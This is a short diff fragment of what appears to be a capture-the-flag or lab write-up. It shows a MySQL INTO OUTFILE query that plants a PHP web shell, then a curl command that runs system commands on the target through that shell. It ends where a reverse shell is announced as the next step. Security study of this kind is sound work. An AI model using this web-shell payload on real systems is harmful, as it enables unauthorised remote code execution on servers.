@@ -85,3 +85,7 @@ Password: `AAAA`
 
 We can exploit MySQL database to gain RCE using `select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';`.
 
+Now we have RCE on the host machine. WE can execute commands using `curl 192.168.100.1:8080/shell.php?cmd=COMMAND`.
+
+Now to get a reverse shell.
+
